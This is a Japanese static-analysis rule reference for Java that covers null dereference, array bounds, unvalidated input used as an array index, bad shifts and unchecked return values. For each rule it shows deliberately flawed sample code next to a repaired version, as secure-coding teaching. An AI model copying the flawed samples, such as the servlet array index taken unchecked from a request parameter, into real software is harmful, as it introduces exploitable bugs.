パラメーターの設定:                                 | public | protected | package private | private |
チェックボックスがオフ                              |    +   |     +     |        +        |    +    |
"public"                                            |    -   |     +     |        +        |    +    |
"protected および public"                           |    -   |     -     |        +        |    +    |
"package-private、protected および public"          |    -   |     -     |        -        |    +    |
"private、package-private、protected および public" |    -   |     -     |        -        |    -    |


次のコードを例として説明します。

    class Example
    {
        protected void foo(Object obj)
        {
            if (obj != null) {
                ...
            }
        }

        void bar(Object obj)
        {
            foo(obj);
            obj.toString(); // 違反はレポートされるか?
        }
    }

bar() 内で違反はレポートされるべきでしょうか。それは、foo() の可視性とルールのパラメーター設定によります。
foo() は protected メソッドであるため、デフォルトのパラメーター設定では、bar() 内の違反はレポートされません。

[引数として null を受け入れないメソッド] パラメーターを使用すると、引数として null を受け入れない
メソッドを列挙できます。
引数として null を受け入れないメソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

- [有効]  メソッドを有効または無効にします。無効化すると、ルールはメソッドが null を受け入れるとみなします。。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
  任意の型で宣言されたメソッド  を指定するには '*' を使用します。
- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。

- [null ではないパラメーター] 列は、null を受け取れない
引数の順序のリストを指定します。1 から始まるカンマ区切りの数を指定するか、'*' を
使用してすべての引数が null を受け取れないことを指定します。

[潜在的な null の返却] チェックボックス グループは、特定のメソッドが null を返す可能性を、
解析の際に考慮するかどうかを指定します。
現在この機能は、標準の Java 2 パッケージ java.lang、java.io、
および java.util のメソッドのために実装されています。
次の 1 つ以上のオプションを有効にできます。

   1 [NULL を返す可能性があり、防止するのが困難な J2SE メソッドを考慮する]
     NULL を返す可能性があり、NULL の返却を防止するのが困難なメソッド。
     ここで、 クライアントは戻り値が NULL ではないという推測をすべきではありません。
     また、必要に応じて必要なチェックを実行するべきです。
     
   2 [NULL を返す可能性があるが、防止するのは困難ではない J2SE メソッドを考慮する]
     NULL を返す可能性があるメソッド。ただし、クライアントがコードを編集して、
   戻り値をチェックしなくてもいいように、NULL を絶対に返さないように変更できるメソッド。

     
   3 [J2SE Collection の getter が NULL を返却できるものとする]
     NULL を返す可能性がある Collection アクセス メソッド
     
public class ExtendedNullPointer
{
    String sFileName = "";

    Map&lt;String, Locale&gt; supportedLocalesMap = new HashMap&lt;String, Locale&gt;();

    int getLineLength()
    {
        String sFirstLine = "First line";
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new FileReader(sFileName));
            sFirstLine = reader.readLine();
        } catch (Exception e) {
            System.out.println("Exception occured. " + e.toString());
            System.out.println("Cause message: " + e.getCause().getMessage()); // 違反(パラメーター #1 がオンの場合)
        } finally {
            close(reader);
        }
        return sFirstLine.length(); // 違反(パラメーター #2 がオンの場合)
    }

    String getCurrentCountryName()
    {
        String sLanguage = System.getProperty("Language");
        String sLngLowerCase = sLanguage.toLowerCase(); // 違反(パラメーター #1 がオンの場合)
        return getCountry(sLngLowerCase, true);
    }

    String getCountry(String languageId, boolean bDisplayName)
    {
        Locale locale = supportedLocalesMap.get(languageId);
        return locale.getCountry(); // 違反(パラメーター #3 がオンの場合)
    }

    private void close(Reader reader)
    {
        if (reader == null) {
            return;
        }
        try {
            reader.close();
        } catch (Exception e) {}
    }
}

[null を返す可能性のある外部関数] パラメーターを使用すると、戻り値が NULL として扱われる追加の
メソッドを定義できます。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールは null を返す可能性のあるメソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。     

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
このルールに従うと、アプリケーションが堅牢になり、どんな状況や入力値でも、
期待された方法で機能するようになります。



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
次のコードは、このルールが違反をレポートするコードです。

public class Example
{
    public void foo(String arg)
    {
        arg.length(); // 違反
    }

    public void goo()
    {
        foo(null);
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
次のコードには違反はレポートされません。引数が null の場合、メソッドは
呼び出されません。

public class Repair
{
    public void foo(String arg)
    {
        if (arg != null) {
            arg.length(); // 違反ではない
        }
    }

    public void goo()
    {
        foo(null);
    }
}

教育とトレーニング

Exceptions
Video: <A target="_blank" HREF="https://vimeo.com/201696974">https://vimeo.com/201696974</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_4-Exceptions.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_4-Exceptions.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-476: NULL Pointer Dereference
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/476.html">https://cwe.mitre.org/data/definitions/476.html</A>

CWE-457: Use of Uninitialized Variable
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/457.html">https://cwe.mitre.org/data/definitions/457.html</A>

SEI CERT Oracle Coding Standard for Java
EXP01-J. Do not use a null in a case where an object is required
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/EXP01-J.+Do+not+use+a+null+in+a+case+where+an+object+is+required">https://wiki.sei.cmu.edu/confluence/display/java/EXP01-J.+Do+not+use+a+null+in+a+case+where+an+object+is+required</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Error Handling p. 83

Tags: CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.OPT.INEFCOL" href="#top">[Top]</a><br/><br/><STRONG>
Collection 要素の非効率な削除を防止する  [BD.OPT.INEFCOL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、
Collection の要素を非効率的に削除しているケースを検出します。

つまり、Collection の要素を取得するためにイテレーターを使用し、その後
コクレションで remove(Object) メソッドを呼び出しているケースです。
対応する要素を Collection に検索させるのではなく、
反復子で直接 remove() メソッドを使用するのが効率的な方法です。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のコードは、このルールが違反をレポートするコードです。

import java.util.Collection;
import java.util.Iterator;

public class Example
{
    public void iterate(Collection&lt;Object&gt; collection)
    {
        Iterator&lt;Object&gt; iter = collection.iterator();
        while (iter.hasNext()) {
            Object element = iter.next();
            collection.remove(element); // 違反
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.util.Collection;
import java.util.Iterator;

public class Repair
{
    public void iterate(Collection&lt;Object&gt; collection)
    {
        Iterator&lt;Object&gt; iter = collection.iterator();
        while (iter.hasNext()) {
            iter.remove(); // 違反ではない
        }
    }
}

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.OPT.INEFMAP" href="#top">[Top]</a><br/><br/><STRONG>
Map エントリの非効率な反復を防止する [BD.OPT.INEFMAP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
Map の キーセットの反復に基づいて Map を非効率に反復している場合、
このルールは違反をレポートします。

パフォーマンスの面でプログラマが犯しやすいミスとして、
Map を反復するために キーセット を使用し、取得した各キーについて
値を要求する処理があります。これは、Map 中のキーによる
比較的重たいルックアップ操作を引き起こします。

キーセット ではなく エントリセット を使用すれば、
非効率な反復を簡単に効率的な反復に変換できます。
entry の各エントリはキーと値のペアを持つため、
重たいルックアップ操作は必要はありません。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
Map はさまざまなアプリケーションで頻繁に使用される操作です。
このルールを使用すると、Map を反復するときに
不必要な処理でパフォーマンスが低下するのを防止できます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
import java.util.Iterator;
import java.util.Map;

public class Example
{
    public void iterate(Map&lt;String, Integer&gt; map)
    {
        Iterator&lt;String&gt; iter = map.keySet().iterator();
        while (iter.hasNext()) {
            String key = iter.next();
            Integer value = map.get(key); // 違反
            // do something with value
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.util.Iterator;
import java.util.Map;

public class Repair
{
    public void iterate(Map&lt;String, Integer&gt; map)
    {
        Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; iter = map.entrySet().iterator();
        while (iter.hasNext()) {
            Map.Entry&lt;String, Integer&gt; entry = iter.next();
            String key = entry.getKey();
            Integer value = entry.getValue(); // 違反ではない
            // do something with value
        }
    }
}

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.OPT.INEFMAPRM" href="#top">[Top]</a><br/><br/><STRONG>
Map エントリの非効率な削除を防止する [BD.OPT.INEFMAPRM]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、
Map エントリを非効率に削除しているケースを検出します。
つまり、キーの値を取得するために Map の キーセット または エントリセットで
イテレーターを使用し、その後 Collection で remove(Object) メソッドを
呼び出しているケースです。

キーの値を使って対応するエントリを Map に検索させるのではなく、
イテレーターで直接 remove() メソッドを使用するのが効率的な方法です。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.util.Iterator;
import java.util.Map;

public class Example
{
    public void remove(Map&lt;String, Integer&gt; map)
    {
        Iterator&lt;String&gt; keyIter = map.keySet().iterator();
        while (keyIter.hasNext()) {
            String key = keyIter.next();
            map.remove(key); // 違反
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

次のコードはより効果的に使用されます。

import java.util.Iterator;
import java.util.Map;

public class Repair
{
    public void remove(Map&lt;String, Integer&gt; map)
    {
        Iterator&lt;String&gt; keyIter = map.keySet().iterator();
        while (keyIter.hasNext()) {
            keyIter.remove(); // 違反ではない
        }
    }
}

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.ARRAY" href="#top">[Top]</a><br/><br/><STRONG>
配列の境界を超えてアクセスしてはならない [BD.PB.ARRAY]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、境界外アクセスにつながる恐れのある配列アクセス操作を検出します。
とくに、明らかな境界外アクセスの可能性がある実行パスをレポートします。
境界外アクセスは、添え字が負数の場合、あるいは配列サイズ以上の場合に発生します。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
配列の境界外にアクセスする可能性があることは深刻な脅威です。
アプリケーションにこの種の脆弱性がある場合、悪用されて任意のコードが実行され、
アプリケーションを完全にコントロールされる可能性があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
配列の境界外へのアクセスという重大な問題を防ぐことができます。
アプリケーション全体の堅牢性を保障するのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    void fillArray(int array[], int size)
    {
        for (int i = 0; i &lt;= size; i++) { // 0 から 100 まで繰り返す
            array[i] = 0; // VIOLATION
        }
    }

    void example()
    {
        int[] array = new int[100];
        fillArray(array, 100);
        // ...
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
'&lt;=' 比較演算子を '&lt;' に変更します。

public class Example
{
    void fillArray(int array[], int size)
    {
        for (int i = 0; i &lt; size; i++) { // 0 から 99 まで繰り返す
            array[i] = 0; // 違反ではない
        }
    }

    void example()
    {
        int[] array = new int[100];
        fillArray(array, 100);
        // ...
    }
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/119.html">https://cwe.mitre.org/data/definitions/119.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-125: Out-of-bounds Read
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/125.html">https://cwe.mitre.org/data/definitions/125.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-787: Out-of-bounds Write
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/787.html">https://cwe.mitre.org/data/definitions/787.html</A>

CWE-129: Improper Validation of Array Index
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/129.html">https://cwe.mitre.org/data/definitions/129.html</A>

CWE-131: Incorrect Calculation of Buffer Size
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/131.html">https://cwe.mitre.org/data/definitions/131.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.ARRAYINP" href="#top">[Top]</a><br/><br/><STRONG>
未検証の入力を配列インデックスとして使用しない [BD.PB.ARRAYINP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、未検証の入力を配列のインデックスとして使用しているために、配列の
境界外にアクセスする可能性がある場合に、違反をレポートします。
任意の値が入る可能性がある入力を、配列の境界内にあるかをチェックせずに
インデックスとして使用している場合、違反がレポートされます。

以下のソースをチェックする必要があります。

   * サーブレット リクエスト
   * リモート メソッド
   * 未検証の Struts フォーム
   * ネットワーク
   * ソケット
   * 環境変数およびシステム プロパティ
   * データベース
   * ファイル
   * パイプ
   * コンソール
   * GUI コントロール


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
配列境界外へのアクセスという重大な問題を防ぐことができます。
アプリケーション全体の堅牢性を保障するのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import javax.servlet.http.HttpServletRequest;

public class Example
{
    void displayCustomerInfo(HttpServletRequest req, Customer[] aCustomers)
    {
        String sCustomerId = req.getParameter("customerId");
        int id = Integer.parseInt(sCustomerId);
        Customer customer = aCustomers[id]; // 違反
        // 顧客情報の表示
    }

    class Customer
    {
        // ...
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
インデックスの値のチェックを追加します。


import javax.servlet.http.HttpServletRequest;

public class Repair
{
    void displayCustomerInfo(HttpServletRequest req, Customer[] aCustomers)
    {
        String sCustomerId = req.getParameter("customerId");
        int id = Integer.parseInt(sCustomerId);
        if (id &gt;= 0 &amp;&amp; id &lt; aCustomers.length) {
            Customer customer = aCustomers[id]; // 違反ではない
            // 顧客情報の表示
        }
    }

    class Customer
    {
        // ...
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/119.html">https://cwe.mitre.org/data/definitions/119.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-125: Out-of-bounds Read
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/125.html">https://cwe.mitre.org/data/definitions/125.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-787: Out-of-bounds Write
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/787.html">https://cwe.mitre.org/data/definitions/787.html</A>

CWE-129: Improper Validation of Array Index
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/129.html">https://cwe.mitre.org/data/definitions/129.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.BADSHIFT" href="#top">[Top]</a><br/><br/><STRONG>
誤ったシフト演算を避ける [BD.PB.BADSHIFT]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、誤ったシフト演算を検出します。ルールをパラメータライズし、
レポート対象とするシフト演算を定義する必要があります (「パラメーター」を参照)。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.0.8


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

誤ったシフト演算の予期しない結果により、セキュリティ上の脅威が入り込む
可能性があります。さらに、誤ったシフト演算は、セキュリティの欠陥を排除し、
データの完全性を保証するために必要なチェックをセキュリティ監査者が判断する
のを難しくします。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[負の値のシフトに対して違反をレポートする]: このパラメーターに true を設定した場合、
シフト演算子の左辺のオペランドが負の値である場合に違反がレポートされます。
デフォルト値は true です。

[負の値によるシフトに対して違反をレポートする]: このパラメーターに true を設定した場合、
シフト演算子の右辺のオペランドが負の値である場合に違反がレポートされます。
デフォルト値は true です。

[大きすぎる値によるシフトに対して違反をレポートする]: このパラメーターに true を設定した場合、
シフト演算子の右辺のオペランドが左辺のオペランドのビット数以上の値である
場合に違反がレポートされます。
デフォルト値は false です。

[シフトの結果としてオーバーフローが発生する場合に違反をレポートする]: このパラメーターに true を設定した場合、
シフト演算の結果としてオーバーフローが発生する場合に違反がレポートされます。
デフォルト値は true です。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
誤ったシフト演算によって起こる可能性があるエラーを防ぐのに役立ちます。



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、シフト演算の結果としてオーバーフローが発生します。

public class Example
{
    long[] getResult()
    {
        long res[] = new long[8];
        int tab[] = new int[] { 0, 1, 2, 3, 4, 5, 6, 7};
        for (int i = 7; i &gt;= 0; i--) {
            res[i] = tab[i] &lt;&lt; (8 * i); // 違反
        }
        return res;
    }
    
    public int calculate()
    {
        int k = 2;
        k -= 52;
        return k &gt;&gt; 2; // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

public class Repair
{
    long[] getResult()
    {
        long res[] = new long[8];
        long tab[] = new long[] { 0, 1, 2, 3, 4, 5, 6, 7};
        for (int i = 7; i &gt;= 0; i--) {
            res[i] = tab[i] &lt;&lt; (8 * i); // 違反ではない
        }
        return res;
    }

    public int calculate()
    {
        int k = 2;
        k -= 52;
        return k / 4; // 違反ではない
    }
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
NUM01-J. Do not perform bitwise and arithmetic operations on the same data
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/NUM01-J.+Do+not+perform+bitwise+and+arithmetic+operations+on+the+same+data">https://wiki.sei.cmu.edu/confluence/display/java/NUM01-J.+Do+not+perform+bitwise+and+arithmetic+operations+on+the+same+data</A>

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.CC" href="#top">[Top]</a><br/><br/><STRONG>
常に同じ値に評価される条件式を避ける [BD.PB.CC]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、常に同じ値に評価される条件を検出します。そのような条件は、
リファクタリングの過程や、コードが発展する際によく見られます。特に、
複数の開発者がコードを編集している場合にあてはまります。下の「サンプル 
コード」の項で示すように、そのような条件の存在は、コードの論理的な誤りを
示唆することがよくあります。さらに、そのような条件は、仮定条件が甘いために、
コードが非効率的になったり、到達できないコードが発生したりする可能性を
示している場合があります


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>

条件と条件を不変にするコードが同じメソッドに存在する場合、たいていはロジックの問題
を意味しています。どちらかが別のメソッドにある場合は、レポートされた違反を
修正する前に、より注意深く確認する必要があります。チェックを削除することが
明白な解決方法ですが、チェックが将来の変更に対する防護策である場合もあるため、
確認が重要です。



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
コードを整った状態に保ち、論理の矛盾が発生したらすぐに取り除くことができます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    public void handleException(Throwable thr)
    {
        if (thr instanceof Exception) {
            System.err.println("Exception found: " + ((Exception)thr).getMessage());
        } else if (thr instanceof RuntimeException) { // 違反
            ((RuntimeException)thr).printStackTrace(System.err);
        } else {
            System.out.println("Throwable: " + thr.toString());
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
コードを修正するには、演算子の順序を変更します。

public class Repair
{
    public void handleException(Throwable thr)
    {
        if (thr instanceof RuntimeException) {
            ((RuntimeException)thr).printStackTrace(System.err);
        } else if (thr instanceof Exception) { // 違反ではない
            System.err.println("Exception found: " + ((Exception)thr).getMessage());
        } else {
            System.out.println("Throwable: " + thr.toString());
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-561: Dead Code
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/561.html">https://cwe.mitre.org/data/definitions/561.html</A>

CWE-570: Expression is Always False
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/570.html">https://cwe.mitre.org/data/definitions/570.html</A>

CWE-571: Expression is Always True
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/571.html">https://cwe.mitre.org/data/definitions/571.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.CHECKRET" href="#top">[Top]</a><br/><br/><STRONG>
非 void メソッドの戻り値を必ずチェックする [BD.PB.CHECKRET]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、通常は戻り値をチェックするメソッドの戻り値をチェックしていない場合に違反をレポート
します。

以下の処理が戻り値のチェックとみなされます。
- 戻り値を条件文で使用する (if、switch、while など)
- 戻り値を &gt;、&lt;、&gt;=、&lt;=、!=、== 演算子を使った二項式で使用する
- 戻り値を検証メソッドのパラメーターとして渡す

以下の処理が戻り値の使用とみなされます。
- 検証メソッド以外のメソッドのパラメーターとして渡す
- 戻り値のフィールドにアクセスする、メソッドを呼び出すなど

以下の場合、戻り値はチェックされていないとみなされます。
- チェックされる前に使用されている
- まったくチェックされていない
- 使用されていない

このルールは、1 つのメソッドのスコープでだけ動作します。そのため、戻り値をさらに
戻り値として返している場合、チェック済みとも未チェックともみなされません。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.4.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

戻り値がチェックされていない場合、攻撃者はメソッドを失敗させたり、その他の方法で予期
しない値を返すよう強制できる場合があります。これにより、プログラマが前提とする
ソフトウェアの状態が不可能になる場合があります。たとえば、プログラムがメソッドを
呼び出して特権を削除しているが、戻り値をチェックして特権が正常に削除されたか
どうかを確認していない場合に、プログラムがより高い権限で実行され続けるケースなどです。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未チェックの範囲しきい値] : いつ違反がレポートされるかを指定します。この範囲は、
メソッドが呼び出された回数に対する戻り値がチェックされた回数の割合を表します。
デフォルトのしきい値は 0.2 です。実際の割合がしきい値を下回る場合、違反がレポート
されます。

[検証メソッド] : パラメータを使用すると、戻り値をチェックするのに使用するメソッドを指定できます。
リストされたメソッドのいずれかにパラメーターとして値を渡すと、返された値はチェック済みである
とみなされます。

以下は [検証メソッド] テーブルの列の説明です。これらの列を使用してメソッドのさまざまな
特徴を指定します。

* [有効] : この列を使用すると、定義したメソッドの一部を一時的に無効化できます。

* [完全修飾型名 (ワイルドカード)] : この列には、メソッドが宣言されている
  型の完全修飾名を入力します。
  すべての型で宣言されているメソッドを指定するには、'*' を使用します。

* [メソッド名 (ワイルドカード)] : この列には、メソッドの名前を指定します。

* [+ サブクラスの定義] : 現在の行の設定が、指定されたクラスのサブ
  クラスで定義された指定された名前のメソッドにも適用されるかどうかを指定します。
  インスタンスメソッドおよび非インスタンスメソッドの両方に適用されることに注意してください。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
メソッドの戻り値をチェックすると、クラッシュやその他の意図しない振る舞いに
つながる予期しない状態や条件を防ぐことができます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public abstract class Example
{
    private int _error;

    public abstract void handleError();

    public int getErrorCode()
    {
        return _error;
    }

    public void usualMethod1()
    {
        int rv = getErrorCode();
        if (rv == -1) {
            handleError();
        }
    }

    public void usualMethod22()
    {
        if (getErrorCode() == -1) {
            handleError();
        }
    }

    public void usualMethod3()
    {
        int rv = getErrorCode();
        if (rv &lt; 0) {
            handleError();
        }
    }

    public void usualMethod4()
    {
        int rv = getErrorCode();
        if (rv &gt; 0) {
            handleError();
        }
    }

    public void usualMethod5()
    {
        int rv = getErrorCode();
        if (rv == -1) {
            handleError();
        }
    }

    public void unusualMethod()
    {
        getErrorCode(); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

public abstract class Repair
{
    private int _error;

    public abstract void handleError();

    public int getErrorCode()
    {
        return _error;
    }

    public void usualMethod1()
    {
        int rv = getErrorCode();
        if (rv == -1) {
            handleError();
        }
    }

    public void usualMethod22()
    {
        if (getErrorCode() == -1) {
            handleError();
        }
    }

    public void usualMethod3()
    {
        int rv = getErrorCode();
        if (rv &lt; 0) {
            handleError();
        }
    }

    public void usualMethod4()
    {
        int rv = getErrorCode();
        if (rv &gt; 0) {
            handleError();
        }
    }

    public void usualMethod5()
    {
        int rv = getErrorCode();
        if (rv == -1) {
            handleError();
        }
    }

    public void unusualMethod()
    {
        int rv = getErrorCode(); // 違反ではない
        if (rv == -1) {
            return;
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

